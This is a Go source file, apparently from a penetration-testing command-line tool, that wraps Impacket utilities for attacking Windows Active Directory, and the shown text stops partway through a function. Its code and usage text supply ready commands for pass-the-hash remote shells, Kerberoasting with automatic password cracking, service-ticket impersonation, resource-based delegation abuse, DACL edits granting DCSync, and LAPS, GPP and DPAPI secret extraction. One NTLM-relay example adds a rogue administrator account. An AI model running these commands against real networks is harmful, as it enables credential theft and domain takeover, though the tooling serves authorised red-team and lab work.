package client

import (
	"fmt"
	"os"
	"strings"
)

// impacketTools is the full list for TAB completion of 'impacket <tool>'.
var impacketTools = []string{
	"addcomputer", "atexec", "changepasswd", "dacledit", "dcomexec",
	"describeTicket", "dpapi", "DumpNTLMInfo", "esentutl", "findDelegation",
	"GetADComputers", "GetADUsers", "getArch", "Get-GPPPassword", "GetLAPSPassword",
	"GetNPUsers", "getPac", "getST", "getTGT", "GetUserSPNs", "goldenPac",
	"keylistattack", "lookupsid", "machine_role", "mimikatz", "mssqlclient",
	"mssqlinstance", "net", "netview", "ntlmrelayx", "owneredit", "psexec",
	"raiseChild", "rbcd", "rdp_check", "reg", "registry-read", "rpcdump", "rpcmap",
	"samrdump", "secretsdump", "services", "smbclient", "smbexec", "smbserver",
	"sniff", "sniffer", "ticketConverter", "ticketer", "wmiexec", "wmipersist", "wmiquery",
}

// buildImpkt returns the impacket-style "[[domain/]user[:pass]]@host" identity string
// and any extra flags needed (e.g. -hashes when -H is given).
func buildImpkt(host, user, pass, domain, hash string) (string, []string) {
	var ident string
	if user != "" {
		if domain != "" {
			ident = domain + "/" + user
		} else {
			ident = user
		}
		if pass != "" && hash == "" {
			ident += ":" + pass
		}
		ident += "@"
	}
	ident += host

	var extra []string
	if hash != "" {
		if !strings.Contains(hash, ":") {
			hash = ":" + hash
		}
		extra = append(extra, "-hashes", hash)
	}
	return ident, extra
}

// ── ejecución remota ──────────────────────────────────────────────────────

const wmiexecUsage = `usage: wmiexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>] [cmd]

  Interactive shell or single command via WMI (no binary on disk).
  -H   NTLM hash :NT  (pass-the-hash)

examples:
  wmiexec 10.2.20.100 -u Administrator -p 'P@ss1!' -d cs.org
  wmiexec 10.2.20.100 -u svc_sql -p shelby 'net localgroup administrators'
  wmiexec 10.2.20.100 -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c`

func (cl *CLI) cmdWmiexec(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" {
		fmt.Println(wmiexecUsage)
		return
	}
	tool := cl.mustTool("impacket-wmiexec", "wmiexec.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	a := append([]string{tool}, extra...)
	a = append(a, ident)
	if len(pos) > 1 {
		a = append(a, pos[1])
	}
	cl.runTool(a)
}

const psexecUsage = `usage: psexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>]

  SYSTEM shell via SMB service (uploads temporary binary).
  -H   NTLM hash :NT  (pass-the-hash)

examples:
  psexec 10.2.20.100 -u Administrator -p 'P@ss1!' -d cs.org
  psexec 10.2.20.100 -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c`

func (cl *CLI) cmdPsexec(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" {
		fmt.Println(psexecUsage)
		return
	}
	tool := cl.mustTool("impacket-psexec", "psexec.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	cl.runTool(append(append([]string{tool}, extra...), ident))
}

const smbexecUsage = `usage: smbexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>]

  Shell via SMB (no binary on disk, uses cmd.exe).
  -H   NTLM hash :NT  (pass-the-hash)

examples:
  smbexec 10.2.20.100 -u Administrator -p 'P@ss1!' -d cs.org
  smbexec 10.2.20.100 -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c`

func (cl *CLI) cmdSmbexec(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" {
		fmt.Println(smbexecUsage)
		return
	}
	tool := cl.mustTool("impacket-smbexec", "smbexec.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	cl.runTool(append(append([]string{tool}, extra...), ident))
}

const dcomexecUsage = `usage: dcomexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>] [-object <obj>] [cmd]

  Shell or command via DCOM. -object: MMC20 | ShellWindows | ShellBrowserWindow (default: MMC20)

examples:
  dcomexec 10.2.20.100 -u Administrator -p 'P@ss1!' -d cs.org
  dcomexec 10.2.20.100 -u Administrator -p 'P@ss1!' -d cs.org -object ShellWindows 'whoami'`

func (cl *CLI) cmdDcomexec(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" {
		fmt.Println(dcomexecUsage)
		return
	}
	tool := cl.mustTool("impacket-dcomexec", "dcomexec.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	a := append([]string{tool}, extra...)
	if obj := flags["object"]; obj != "" {
		a = append(a, "-object", obj)
	}
	a = append(a, ident)
	if len(pos) > 1 {
		a = append(a, pos[1])
	}
	cl.runTool(a)
}

const atexecUsage = `usage: atexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>] <cmd>

  Execute a command via Task Scheduler (no interactive shell).

examples:
  atexec 10.2.20.100 -u Administrator -p 'P@ss1!' -d cs.org 'whoami /all'
  atexec 10.2.20.100 -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c 'hostname'`

func (cl *CLI) cmdAtexec(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) < 2 || flags["u"] == "" {
		fmt.Println(atexecUsage)
		return
	}
	tool := cl.mustTool("impacket-atexec", "atexec.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	cl.runTool(append(append([]string{tool}, extra...), ident, pos[1]))
}

// ── kerberos ──────────────────────────────────────────────────────────────

const kerberoastUsage = `usage: kerberoast <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] [-w <wordlist>]

  Requests TGS for all accounts with SPN and saves the hashes.
  If hashes are obtained, attempts to crack them automatically with john.
  -w   wordlist (default: badpwds.txt if it exists, or rockyou.txt)

examples:
  kerberoast 10.2.20.100 -d cs.org -u mssql_svc -p shelby
  kerberoast 10.2.20.100 -d cs.org -u mssql_svc -H :aad3b435b51404eeaad3b435b51404ee
  kerberoast 10.2.20.100 -d cs.org -u mssql_svc -p shelby -w /usr/share/wordlists/rockyou.txt`

func (cl *CLI) cmdKerberoast(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" {
		fmt.Println(kerberoastUsage)
		return
	}
	tool := cl.mustTool("impacket-GetUserSPNs", "GetUserSPNs.py")
	if tool == "" {
		return
	}
	target := pos[0]
	outFile := "/tmp/kerberoast_" + strings.ReplaceAll(target, ".", "_") + ".hash"
	ident, extra := buildImpkt(target, flags["u"], flags["p"], flags["d"], flags["H"])

	a := append([]string{tool}, extra...)
	a = append(a, ident, "-dc-ip", target, "-request", "-outputfile", outFile)
	fmt.Printf("[*] kerberoasting → %s  domain=%s\n", target, flags["d"])
	cl.runTool(a)

	data, err := os.ReadFile(outFile)
	if err != nil || len(data) == 0 {
		fmt.Println("[!] no Kerberoast hashes obtained")
		return
	}
	fmt.Printf("[+] hashes → %s\n", outFile)

	john := cl.findTool("john")
	if john == "" {
		return
	}
	wordlist := flags["w"]
	if wordlist == "" {
		if _, e := os.Stat("badpwds.txt"); e == nil {
			wordlist = "badpwds.txt"
		} else {
			wordlist = "/usr/share/wordlists/rockyou.txt"
		}
	}
	fmt.Printf("[*] john --wordlist=%s\n", wordlist)
	cl.runTool([]string{john, "--format=krb5tgs", "--wordlist=" + wordlist, outFile})
	cl.runTool([]string{john, "--format=krb5tgs", "--show", outFile})
}

const getTGTUsage = `usage: gettgt <target> -d <domain> -u <user> [-p <pass>] [-H <hash>]

  Requests a TGT and saves it as <user>.ccache.
  -H   NTLM hash :NT  (overpass-the-hash → TGT)

  After running:
    export KRB5CCNAME=<user>.ccache

examples:
  gettgt 10.2.20.100 -d cs.org -u mssql_svc -p shelby
  gettgt 10.2.20.100 -d cs.org -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c`

func (cl *CLI) cmdGetTGT(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" {
		fmt.Println(getTGTUsage)
		return
	}
	tool := cl.mustTool("impacket-getTGT", "getTGT.py")
	if tool == "" {
		return
	}
	target, domain, user, pass, hash := pos[0], flags["d"], flags["u"], flags["p"], flags["H"]
	identity := domain + "/" + user

	a := []string{tool, identity, "-dc-ip", target}
	if hash != "" {
		if !strings.Contains(hash, ":") {
			hash = ":" + hash
		}
		a = append(a, "-hashes", hash)
	} else {
		a = append(a, "-password", pass)
	}
	outCcache := user + ".ccache"
	fmt.Printf("[*] getTGT → %s@%s\n", user, domain)
	cl.runTool(a)
	if _, err := os.Stat(outCcache); err == nil {
		fmt.Printf("[+] export KRB5CCNAME=%s\n", outCcache)
	}
}

const getSTUsage = `usage: getst <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] -spn <spn> [-impersonate <user>]

  Requests a service ticket (silver ticket / S4U2Proxy).
  -spn          target SPN  (e.g.: cifs/WIN2022.cs.org)
  -impersonate  user to impersonate via S4U2Proxy

  After running:
    export KRB5CCNAME=<user>@<spn>@DOMAIN.ccache

examples:
  getst 10.2.20.100 -d cs.org -u svc_sql -p shelby -spn cifs/WIN2022-SRV-X64.cs.org
  getst 10.2.20.100 -d cs.org -u svc_sql -p shelby -spn cifs/WIN2022-SRV-X64.cs.org -impersonate Administrator`

func (cl *CLI) cmdGetST(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" || flags["spn"] == "" {
		fmt.Println(getSTUsage)
		return
	}
	tool := cl.mustTool("impacket-getST", "getST.py")
	if tool == "" {
		return
	}
	target, domain, user, pass, hash := pos[0], flags["d"], flags["u"], flags["p"], flags["H"]
	identity := domain + "/" + user

	a := []string{tool, identity, "-dc-ip", target, "-spn", flags["spn"]}
	if hash != "" {
		if !strings.Contains(hash, ":") {
			hash = ":" + hash
		}
		a = append(a, "-hashes", hash)
	} else if pass != "" {
		a = append(a, "-password", pass)
	}
	if imp := flags["impersonate"]; imp != "" {
		a = append(a, "-impersonate", imp)
	}
	fmt.Printf("[*] getST → %s  spn=%s\n", target, flags["spn"])
	cl.runTool(a)
}

const describeTicketUsage = `usage: describeticket <ticket.ccache>

  Decodes and shows the fields of a Kerberos ticket (.ccache or .kirbi).

examples:
  describeticket Administrator.ccache
  describeticket silver.kirbi`

func (cl *CLI) cmdDescribeTicket(args []string) {
	pos, _ := parseLocalFlags(args)
	if len(pos) == 0 {
		fmt.Println(describeTicketUsage)
		return
	}
	tool := cl.mustTool("impacket-describeTicket", "describeTicket.py")
	if tool == "" {
		return
	}
	cl.runTool([]string{tool, pos[0]})
}

const ticketConverterUsage = `usage: ticketconverter <input> <output>

  Converts tickets between .ccache (Linux) and .kirbi (Windows/Mimikatz).

examples:
  ticketconverter Administrator.ccache Administrator.kirbi
  ticketconverter ticket.kirbi ticket.ccache`

func (cl *CLI) cmdTicketConverter(args []string) {
	pos, _ := parseLocalFlags(args)
	if len(pos) < 2 {
		fmt.Println(ticketConverterUsage)
		return
	}
	tool := cl.mustTool("impacket-ticketConverter", "ticketConverter.py")
	if tool == "" {
		return
	}
	cl.runTool([]string{tool, pos[0], pos[1]})
}

// ── enumeración AD/SMB ────────────────────────────────────────────────────

const lookupsidUsage = `usage: lookupsid <target> [-u <user>] [-p <pass>] [-d <domain>] [-H <hash>] [-range <N>]

  RID brute-force to enumerate local or domain users and groups.
  -range   max RID (default 4000)

  Null session (no credentials):
    lookupsid 10.2.20.100

examples:
  lookupsid 10.2.20.100
  lookupsid 10.2.20.100 -u mssql_svc -p shelby
  lookupsid 10.2.20.100 -u mssql_svc -p shelby -range 6000`

func (cl *CLI) cmdLookupSID(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 {
		fmt.Println(lookupsidUsage)
		return
	}
	tool := cl.mustTool("impacket-lookupsid", "lookupsid.py")
	if tool == "" {
		return
	}
	var a []string
	if flags["u"] != "" {
		ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
		a = append([]string{tool}, extra...)
		a = append(a, ident)
	} else {
		a = []string{tool, pos[0]}
	}
	if r := flags["range"]; r != "" {
		a = append(a, r)
	}
	cl.runTool(a)
}

const samrdumpUsage = `usage: samrdump <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>]

  Enumerates users, groups and password policies via SAMR.

examples:
  samrdump 10.2.20.100 -u mssql_svc -p shelby
  samrdump 10.2.20.100 -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c -d cs.org`

func (cl *CLI) cmdSamrdump(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" {
		fmt.Println(samrdumpUsage)
		return
	}
	tool := cl.mustTool("impacket-samrdump", "samrdump.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	cl.runTool(append(append([]string{tool}, extra...), ident))
}

const rpcdumpUsage = `usage: rpcdump <target> [-u <user>] [-p <pass>] [-d <domain>] [-port <port>]

  Enumerates RPC/MSRPC endpoints exposed by the target.
  -port   port (default: 135)

examples:
  rpcdump 10.2.20.100
  rpcdump 10.2.20.100 -u mssql_svc -p shelby
  rpcdump 10.2.20.100 -port 445`

func (cl *CLI) cmdRPCDump(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 {
		fmt.Println(rpcdumpUsage)
		return
	}
	tool := cl.mustTool("impacket-rpcdump", "rpcdump.py")
	if tool == "" {
		return
	}
	var a []string
	if port := flags["port"]; port != "" {
		a = []string{tool, "-port", port}
	} else {
		a = []string{tool}
	}
	if flags["u"] != "" {
		ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
		a = append(a, extra...)
		a = append(a, ident)
	} else {
		a = append(a, pos[0])
	}
	cl.runTool(a)
}

const getadusersUsage = `usage: getadusers <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] [-all]

  Enumerates AD users via LDAP. -all shows additional attributes.

examples:
  getadusers 10.2.20.100 -d cs.org -u mssql_svc -p shelby
  getadusers 10.2.20.100 -d cs.org -u mssql_svc -p shelby -all`

func (cl *CLI) cmdGetADUsers(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" {
		fmt.Println(getadusersUsage)
		return
	}
	tool := cl.mustTool("impacket-GetADUsers", "GetADUsers.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	a := append([]string{tool}, extra...)
	a = append(a, "-dc-ip", pos[0])
	if flags["all"] != "" {
		a = append(a, "-all")
	}
	a = append(a, ident)
	cl.runTool(a)
}

const getadcomputersUsage = `usage: getadcomputers <target> -d <domain> -u <user> [-p <pass>] [-H <hash>]

  Enumerates AD computers via LDAP.

examples:
  getadcomputers 10.2.20.100 -d cs.org -u mssql_svc -p shelby`

func (cl *CLI) cmdGetADComputers(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" {
		fmt.Println(getadcomputersUsage)
		return
	}
	tool := cl.mustTool("impacket-GetADComputers", "GetADComputers.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	a := append([]string{tool}, extra...)
	a = append(a, "-dc-ip", pos[0], ident)
	cl.runTool(a)
}

const findDelegationUsage = `usage: finddelegation <target> -d <domain> -u <user> [-p <pass>] [-H <hash>]

  Searches for accounts with delegation configured (Unconstrained, Constrained, RBCD).

examples:
  finddelegation 10.2.20.100 -d cs.org -u mssql_svc -p shelby`

func (cl *CLI) cmdFindDelegation(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" {
		fmt.Println(findDelegationUsage)
		return
	}
	tool := cl.mustTool("impacket-findDelegation", "findDelegation.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	a := append([]string{tool}, extra...)
	a = append(a, "-dc-ip", pos[0], ident)
	cl.runTool(a)
}

const getLAPSUsage = `usage: getlaps <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] [-computer <name>]

  Reads LAPS passwords for computers in AD.
  -computer  filter by computer name (e.g.: WIN2022-SRV-X64$)

examples:
  getlaps 10.2.20.100 -d cs.org -u Administrator -p 'P@ss1!'
  getlaps 10.2.20.100 -d cs.org -u Administrator -p 'P@ss1!' -computer WIN2022-SRV-X64$`

func (cl *CLI) cmdGetLAPS(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" {
		fmt.Println(getLAPSUsage)
		return
	}
	tool := cl.mustTool("impacket-GetLAPSPassword", "GetLAPSPassword.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	a := append([]string{tool}, extra...)
	a = append(a, "-dc-ip", pos[0])
	if c := flags["computer"]; c != "" {
		a = append(a, "-computer", c)
	}
	a = append(a, ident)
	cl.runTool(a)
}

const getgppUsage = `usage: getgpp <target> -d <domain> -u <user> [-p <pass>] [-H <hash>]

  Searches for passwords in GPP/Preferences (SYSVOL cpassword).

examples:
  getgpp 10.2.20.100 -d cs.org -u mssql_svc -p shelby`

func (cl *CLI) cmdGetGPP(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" {
		fmt.Println(getgppUsage)
		return
	}
	tool := cl.mustTool("impacket-Get-GPPPassword", "Get-GPPPassword.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	a := append([]string{tool}, extra...)
	a = append(a, "-dc-ip", pos[0], ident)
	cl.runTool(a)
}

const dumpntlminfoUsage = `usage: dumpntlminfo <target>

  Obtains NTLM information from the target (name, domain, OS version) without authentication.

examples:
  dumpntlminfo 10.2.20.100`

func (cl *CLI) cmdDumpNTLMInfo(args []string) {
	pos, _ := parseLocalFlags(args)
	if len(pos) == 0 {
		fmt.Println(dumpntlminfoUsage)
		return
	}
	tool := cl.mustTool("impacket-DumpNTLMInfo", "DumpNTLMInfo.py")
	if tool == "" {
		return
	}
	cl.runTool([]string{tool, pos[0]})
}

// ── servicios de red ──────────────────────────────────────────────────────

const mssqlclientUsage = `usage: mssqlclient <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>] [-windows-auth] [-port <port>]

  Interactive MSSQL client. With -windows-auth uses Windows/Kerberos authentication.
  Once connected: help / xp_cmdshell / enable_xp_cmdshell

examples:
  mssqlclient 10.2.20.100 -u sa -p 'P@ss1!'
  mssqlclient 10.2.20.100 -u mssql_svc -p shelby -d cs.org -windows-auth
  mssqlclient 10.2.20.100 -u mssql_svc -H :8846f7eaee8fb117ad06bdd830b7586c -windows-auth`

func (cl *CLI) cmdMssqlclient(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" {
		fmt.Println(mssqlclientUsage)
		return
	}
	tool := cl.mustTool("impacket-mssqlclient", "mssqlclient.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	a := append([]string{tool}, extra...)
	if flags["windows-auth"] != "" {
		a = append(a, "-windows-auth")
	}
	if port := flags["port"]; port != "" {
		a = append(a, "-port", port)
	}
	a = append(a, ident)
	cl.runTool(a)
}

const smbclientUsage = `usage: smbclient <target> [-u <user>] [-p <pass>] [-d <domain>] [-H <hash>]

  Interactive SMB client to browse shares and transfer files.
  Without credentials attempts null/guest session.

examples:
  smbclient 10.2.20.100
  smbclient 10.2.20.100 -u mssql_svc -p shelby -d cs.org`

func (cl *CLI) cmdSmbclient(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 {
		fmt.Println(smbclientUsage)
		return
	}
	tool := cl.mustTool("impacket-smbclient", "smbclient.py")
	if tool == "" {
		return
	}
	var a []string
	if flags["u"] != "" {
		ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
		a = append(append([]string{tool}, extra...), ident)
	} else {
		a = []string{tool, pos[0]}
	}
	cl.runTool(a)
}

const smbserverUsage = `usage: smbserver <share_name> <share_path> [-port <port>]

  Starts an SMB server on Kali to share files.
  Useful for serving payloads to the target without uploading to HTTP.
  -port   SMB port (default 445, requires root; use 4445 without root)

examples:
  smbserver SHARE /tmp/payloads
  smbserver SHARE /tmp/payloads -port 4445

  On the target (Windows):
    copy \\10.2.20.200\SHARE\agent.exe .`

func (cl *CLI) cmdSmbserver(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) < 2 {
		fmt.Println(smbserverUsage)
		return
	}
	tool := cl.mustTool("impacket-smbserver", "smbserver.py")
	if tool == "" {
		return
	}
	a := []string{tool}
	if port := flags["port"]; port != "" {
		a = append(a, "-port", port)
	}
	a = append(a, pos[0], pos[1])
	cl.runTool(a)
}

const ntlmrelayxUsage = `usage: ntlmrelayx -tf <targets.txt> [-smb2] [-socks] [-l <outdir>] [-c <cmd>]

  Relay of captured NTLM authentications to targets in targets.txt.
  Combine with responder -A (analysis mode) to avoid interference.
  -smb2   enable SMB2 support
  -socks  SOCKS mode (maintains authenticated sessions)
  -l      dump SAM to directory
  -c      execute command instead of dumping SAM

examples:
  ntlmrelayx -tf targets.txt -smb2
  ntlmrelayx -tf targets.txt -smb2 -socks
  ntlmrelayx -tf targets.txt -smb2 -c 'net user hacker P@ss /add && net localgroup administrators hacker /add'`

func (cl *CLI) cmdNtlmrelayx(args []string) {
	if len(args) == 0 {
		fmt.Println(ntlmrelayxUsage)
		return
	}
	tool := cl.mustTool("impacket-ntlmrelayx", "ntlmrelayx.py")
	if tool == "" {
		return
	}
	// Pass all arguments directly — ntlmrelayx has many options
	cl.runTool(append([]string{tool}, args...))
}

// ── AD privilege escalation / DACL ────────────────────────────────────────

const dacleditUsage = `usage: dacledit <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] -action <read|write|remove> [-principal <user>] [-rights <perm>] [-target <dn>]

  Reads or modifies DACLs of AD objects.
  -action   read | write | remove
  -principal  user/group to assign/remove the right from
  -rights   FullControl | ResetPassword | WriteMembers | DCSync | ...
  -target   Distinguished Name of the target object

examples:
  dacledit 10.2.20.100 -d cs.org -u Administrator -p 'P@ss1!' -action read -target-dn 'DC=cs,DC=org'
  dacledit 10.2.20.100 -d cs.org -u Administrator -p 'P@ss1!' -action write -rights DCSync -principal hacker -target-dn 'DC=cs,DC=org'`

func (cl *CLI) cmdDacledit(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" || flags["action"] == "" {
		fmt.Println(dacleditUsage)
		return
	}
	tool := cl.mustTool("impacket-dacledit", "dacledit.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	a := append([]string{tool}, extra...)
	a = append(a, "-dc-ip", pos[0], "-action", flags["action"])
	if v := flags["principal"]; v != "" {
		a = append(a, "-principal", v)
	}
	if v := flags["rights"]; v != "" {
		a = append(a, "-rights", v)
	}
	if v := flags["target"]; v != "" {
		a = append(a, "-target", v)
	}
	if v := flags["target-dn"]; v != "" {
		a = append(a, "-target-dn", v)
	}
	a = append(a, ident)
	cl.runTool(a)
}

const rbcdUsage = `usage: rbcd <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] -action <read|write|remove> [-delegate-from <src>] [-delegate-to <dst>]

  Manages Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity).
  -action        read | write | remove
  -delegate-from computer that can delegate  (e.g.: EVIL$)
  -delegate-to   target computer             (e.g.: WIN2022-SRV-X64$)

examples:
  rbcd 10.2.20.100 -d cs.org -u mssql_svc -p shelby -action read -delegate-to WIN2022-SRV-X64$
  rbcd 10.2.20.100 -d cs.org -u mssql_svc -p shelby -action write -delegate-from EVIL$ -delegate-to WIN2022-SRV-X64$`

func (cl *CLI) cmdRBCD(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" || flags["action"] == "" {
		fmt.Println(rbcdUsage)
		return
	}
	tool := cl.mustTool("impacket-rbcd", "rbcd.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	a := append([]string{tool}, extra...)
	a = append(a, "-dc-ip", pos[0], "-action", flags["action"])
	if v := flags["delegate-from"]; v != "" {
		a = append(a, "-delegate-from", v)
	}
	if v := flags["delegate-to"]; v != "" {
		a = append(a, "-delegate-to", v)
	}
	a = append(a, ident)
	cl.runTool(a)
}

const addcomputerUsage = `usage: addcomputer <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] [-name <computer$>] [-cpass <pass>]

  Adds a machine account to the domain (useful for RBCD).
  -name    computer name (e.g.: EVIL$); a random one is generated if omitted
  -cpass   computer password (default: Passw0rd!)

examples:
  addcomputer 10.2.20.100 -d cs.org -u mssql_svc -p shelby
  addcomputer 10.2.20.100 -d cs.org -u mssql_svc -p shelby -name EVIL$ -cpass 'C0mputer!'`

func (cl *CLI) cmdAddComputer(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" {
		fmt.Println(addcomputerUsage)
		return
	}
	tool := cl.mustTool("impacket-addcomputer", "addcomputer.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	a := append([]string{tool}, extra...)
	a = append(a, "-dc-ip", pos[0])
	if v := flags["name"]; v != "" {
		a = append(a, "-computer-name", v)
	}
	cp := flags["cpass"]
	if cp == "" {
		cp = "Passw0rd!"
	}
	a = append(a, "-computer-pass", cp, ident)
	cl.runTool(a)
}

const changepasswdUsage = `usage: changepasswd <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] -np <newpass> [-alt-u <altuser>] [-alt-p <altpass>]

  Changes the password of an AD account.
  Without -alt-u/-alt-p changes the authenticated user's own password.
  With -alt-u/-alt-p forces a password change for another user (requires permissions).

examples:
  changepasswd 10.2.20.100 -d cs.org -u mssql_svc -p shelby -np 'N3wPass!'
  changepasswd 10.2.20.100 -d cs.org -u Administrator -p 'P@ss1!' -np 'N3wPass!' -alt-u victim`

func (cl *CLI) cmdChangePasswd(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" || flags["np"] == "" {
		fmt.Println(changepasswdUsage)
		return
	}
	tool := cl.mustTool("impacket-changepasswd", "changepasswd.py")
	if tool == "" {
		return
	}
	ident, extra := buildImpkt(pos[0], flags["u"], flags["p"], flags["d"], flags["H"])
	a := append([]string{tool}, extra...)
	a = append(a, "-dc-ip", pos[0], "-newpasswd", flags["np"])
	if v := flags["alt-u"]; v != "" {
		a = append(a, "-altuser", v)
	}
	if v := flags["alt-p"]; v != "" {
		a = append(a, "-altpass", v)
	}
	a = append(a, ident)
	cl.runTool(a)
}

// ── DPAPI ─────────────────────────────────────────────────────────────────

const dpapiUsage = `usage: dpapi <subcommand> [options]

  Extracts DPAPI-protected secrets (masterkeys, credentials, vaults, browsers).

  main subcommands:
    masterkey   decrypt masterkeys
    credential  decrypt DPAPI credential
    vault       decrypt vault (.vrd/.vpol)
    backupkeys  dump DC backup keys (requires DA)
    chrome      Chrome/Edge credentials

  For detailed help on each subcommand:
    !impacket-dpapi <subcommand> --help

examples:
  dpapi backupkeys -d cs.org -u Administrator -p 'P@ss1!' --dc-ip 10.2.20.100 --export
  dpapi masterkey -file /tmp/masterkey -sid S-1-5-21-... -pvk domain_backup.pvk
  dpapi credential -file /tmp/cred -key <hex_key>`

func (cl *CLI) cmdDpapi(args []string) {
	if len(args) == 0 {
		fmt.Println(dpapiUsage)
		return
	}
	tool := cl.mustTool("impacket-dpapi", "dpapi.py")
	if tool == "" {
		return
	}
	cl.runTool(append([]string{tool}, args...))
}

// ── passthrough genérico ──────────────────────────────────────────────────

const impacketUsage = `usage: impacket <tool> [arguments...]

  Direct passthrough to any installed impacket tool.
  Equivalent to running: impacket-<tool> [arguments...]

  TAB completes available tool names.

tools (selection):
  Execution:  wmiexec  psexec  smbexec  dcomexec  atexec
  Kerberos:   GetNPUsers  GetUserSPNs  getTGT  getST  goldenPac  ticketer
  Enum AD:    GetADUsers  GetADComputers  findDelegation  GetLAPSPassword  Get-GPPPassword
  Net/SMB:    lookupsid  samrdump  rpcdump  rpcmap  smbclient  smbserver
  MSSQL:      mssqlclient  mssqlinstance
  Relay:      ntlmrelayx
  DACL/Priv:  dacledit  owneredit  rbcd  addcomputer  changepasswd
  Tickets:    describeTicket  ticketConverter
  DPAPI:      dpapi
  Dump:       secretsdump  reg  DumpNTLMInfo
  Kerberos+:  keylistattack  raiseChild  getPac
  Other:      getArch  rdp_check  services  netview  machine_role  exchanger

  For help with a specific tool:
    impacket <tool> --help

examples:
  impacket rpcmap 10.2.20.100 -auth-level 1
  impacket goldenPac cs.org/Administrator:'P@ss1!'@WIN2022-SRV-X64.cs.org
  impacket owneredit cs.org/admin:'P@ss1!'@10.2.20.100 -action read -target victim`

func (cl *CLI) cmdImpacket(args []string) {
	if len(args) == 0 {
		fmt.Println(impacketUsage)
		return
	}
	toolName := args[0]
